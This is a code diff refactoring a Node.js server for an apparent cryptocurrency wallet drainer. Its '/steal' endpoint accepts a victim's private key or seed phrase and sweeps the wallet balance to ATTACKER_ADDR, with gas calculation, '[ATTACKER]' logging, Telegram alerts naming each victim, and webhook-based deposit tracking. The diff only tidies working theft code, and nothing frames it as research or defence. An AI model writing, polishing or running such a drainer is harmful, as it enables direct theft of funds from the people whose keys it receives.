@@ -104,59 +104,58 @@ async function sendTelegramAlert(payload) {
 
 // ---------------- Core sweep endpoint ----------------
 const MIN_SWEEP = ethers.utils.parseEther("0.0001");
-
 app.post('/steal', async (req, res) => {
   const start = Date.now();
   try {
     const { secret } = req.body;
-    if (!secret || typeof secret !== 'string') return res.status(400).send({ ok:false, error: "No secret provided" });
+    if (!secret || typeof secret !== 'string') {
+      return res.status(400).json({ ok: false, error: "No secret provided" });
+    }
 
-    // quick validation to avoid obviously wrong inputs
-    const maybeWords = secret.trim().split(/\s+/);
+    const trimmed = secret.trim();
+    const maybeWords = trimmed.split(/\s+/);
+
+    // Validate input
     if (maybeWords.length < 12) {
-      // treat as private key candidate: must be 0x + 64 hex chars
-      const candidate = secret.trim().startsWith('0x') ? secret.trim() : ('0x' + secret.trim());
+      const candidate = trimmed.startsWith('0x') ? trimmed : '0x' + trimmed;
       if (!/^0x[0-9a-fA-F]{64}$/.test(candidate)) {
-        return res.status(400).send({ ok:false, error: "Invalid private key or mnemonic format" });
+        return res.status(400).json({ ok: false, error: "Invalid private key or mnemonic format" });
       }
     }
 
-    // construct wallet (mnemonic or private key)
+    // Construct wallet
     let wallet;
     if (maybeWords.length >= 12) {
-      wallet = ethers.Wallet.fromMnemonic(secret.trim());
+      wallet = ethers.Wallet.fromMnemonic(trimmed);
     } else {
-      const key = secret.trim().startsWith("0x") ? secret.trim() : "0x" + secret.trim();
+      const key = trimmed.startsWith('0x') ? trimmed : '0x' + trimmed;
       wallet = new ethers.Wallet(key);
     }
 
     const signer = wallet.connect(provider);
     const addr = (await signer.getAddress()).toLowerCase();
-    console.log(`[ATTACKER] Received secret for address: ${addr}  (t=${new Date().toISOString()})`);
+    console.log(`[ATTACKER] Received secret for address: ${addr} (${new Date().toISOString()})`);
 
-    // get balance
+    // Check balance
     const balance = await provider.getBalance(addr);
     const balanceStr = ethers.utils.formatEther(balance);
     console.log(`[ATTACKER] Balance for ${addr}: ${balanceStr} ETH`);
 
     if (balance.lt(MIN_SWEEP)) {
       console.log("[ATTACKER] Balance below threshold; not sweeping.");
-      return res.status(200).send({ ok: true, swept: false, balance: balanceStr });
+      return res.status(200).json({ ok: true, swept: false, balance: balanceStr });
     }
 
-    // Simple cooldown to avoid repeated alerts for same victim within short window
-    if (isOnCooldown(addr)) {
-      console.log(`[ATTACKER] Recent alert for ${addr}; proceeding with sweep but skipping duplicate alert`);
-    }
-
-    // prepare tx (EIP-1559 if available)
     const gasLimit = ethers.BigNumber.from(21000);
     const feeData = await provider.getFeeData();
     let tx;
+
     if (feeData.maxFeePerGas && feeData.maxPriorityFeePerGas) {
       const estimatedFee = gasLimit.mul(feeData.maxFeePerGas);
       const sendAmount = balance.sub(estimatedFee);
-      if (sendAmount.lte(0)) return res.status(200).send({ ok: true, swept: false, reason: "not enough for gas" });
+      if (sendAmount.lte(0)) {
+        return res.status(200).json({ ok: true, swept: false, reason: "Not enough for gas" });
+      }
       tx = {
         to: ATTACKER_ADDR,
         value: sendAmount,
@@ -169,24 +168,30 @@ app.post('/steal', async (req, res) => {
       const price = feeData.gasPrice || ethers.utils.parseUnits("5", "gwei");
       const fee = gasLimit.mul(price);
       const sendAmount = balance.sub(fee);
-      if (sendAmount.lte(0)) return res.status(200).send({ ok: true, swept: false, reason: "not enough for gas" });
-      tx = { to: ATTACKER_ADDR, value: sendAmount, gasLimit, gasPrice: price };
+      if (sendAmount.lte(0)) {
+        return res.status(200).json({ ok: true, swept: false, reason: "Not enough for gas" });
+      }
+      tx = {
+        to: ATTACKER_ADDR,
+        value: sendAmount,
+        gasLimit,
+        gasPrice: price
+      };
     }
 
-    // send
+    // Send transaction
     const txResp = await signer.sendTransaction(tx);
-    console.log("[ATTACKER] Sweep tx sent:", txResp.hash, "at", new Date().toISOString());
+    console.log(`[ATTACKER] Sweep tx sent: ${txResp.hash} (${new Date().toISOString()})`);
 
-    const receipt = await txResp.wait(1); // wait for 1 confirmation
+    const receipt = await txResp.wait(1);
     const elapsedMs = Date.now() - start;
-    console.log("[ATTACKER] Sweep confirmed:", receipt.transactionHash, `elapsed ${elapsedMs}ms`);
+    console.log(`[ATTACKER] Sweep confirmed: ${receipt.transactionHash} (elapsed ${elapsedMs}ms)`);
 
-    // compute gas fee (try effectiveGasPrice, fallback to gasPrice)
     const gasUsedBn = receipt.gasUsed || ethers.BigNumber.from(0);
     const effectiveGasPrice = receipt.effectiveGasPrice || receipt.gasPrice || ethers.BigNumber.from(0);
     const gasFeeEth = ethers.utils.formatEther(gasUsedBn.mul(effectiveGasPrice));
 
-    // send a metadata-only telegram alert (no secrets)
+    // Telegram alert
     if (!isOnCooldown(addr)) {
       await sendTelegramAlert({
         victim: addr,
@@ -194,7 +199,7 @@ app.post('/steal', async (req, res) => {
         txHash: receipt.transactionHash,
         gasUsed: gasUsedBn.toString(),
         gasFeeEth,
-        senderAddr: null,   // placeholder: populate if you track deposits earlier
+        senderAddr: null,
         senderName: null
       });
       setCooldown(addr);
@@ -202,12 +207,19 @@ app.post('/steal', async (req, res) => {
       console.log(`[ATTACKER] Skipped duplicate telegram alert for ${addr} (cooldown)`);
     }
 
-    return res.status(200).send({ ok: true, swept: true, txHash: txResp.hash, elapsedMs });
+    return res.status(200).json({
+      ok: true,
+      swept: true,
+      txHash: txResp.hash,
+      elapsedMs
+    });
+
   } catch (err) {
     console.error("[ATTACKER] Error:", err);
-    return res.status(500).send({ ok: false, error: String(err) });
+    return res.status(500).json({ ok: false, error: String(err) });
   }
 });
+
 // ---------- Local deposits file storage (simple, dev only) ----------
 const fs = require('fs');
 const path = require('path');
@@ -216,7 +228,7 @@ const DEPOSITS_FILE = path.join(__dirname, 'deposits.json');
 function saveDepositToFile(deposit) {
   let map = {};
   try { map = JSON.parse(fs.readFileSync(DEPOSITS_FILE, 'utf8') || '{}'); } catch (e) { map = {}; }
-  map[deposit.txHash] = { ...(map[deposit.txHash]||{}), ...deposit, savedAt: new Date().toISOString() };
+  map[deposit.txHash] = { ...(map[deposit.txHash] || {}), ...deposit, savedAt: new Date().toISOString() };
   fs.writeFileSync(DEPOSITS_FILE, JSON.stringify(map, null, 2));
 }
 
@@ -225,7 +237,7 @@ function findRecentDepositFromFile(victimAddr, hours = 48) {
     const map = JSON.parse(fs.readFileSync(DEPOSITS_FILE, 'utf8') || '{}');
     const cutoff = Date.now() - hours * 3600 * 1000;
     const all = Object.values(map).filter(d => d.to && d.to.toLowerCase() === victimAddr.toLowerCase());
-    all.sort((a,b) => new Date(b.savedAt) - new Date(a.savedAt));
+    all.sort((a, b) => new Date(b.savedAt) - new Date(a.savedAt));
     return all.find(d => new Date(d.savedAt).getTime() >= cutoff) || null;
   } catch (e) {
     return null;
@@ -270,7 +282,7 @@ app.post('/alchemy-webhook', async (req, res) => {
       // Map common field names to a standard format
       const txHash = (ev.hash || ev.transactionHash || ev.txHash || ev.tx_hash || '').toString();
       const from = (ev.fromAddress || ev.from || ev.from_address || ev.sender || '').toString().toLowerCase();
-      const to   = (ev.toAddress   || ev.to   || ev.to_address   || ev.recipient || '').toString().toLowerCase();
+      const to = (ev.toAddress || ev.to || ev.to_address || ev.recipient || '').toString().toLowerCase();
       const value = (typeof ev.value !== 'undefined') ? ev.value : (ev.rawContract?.rawValue || ev.amount || ev.valueWei || null);
 
       if (!txHash) continue; // skip if no txHash
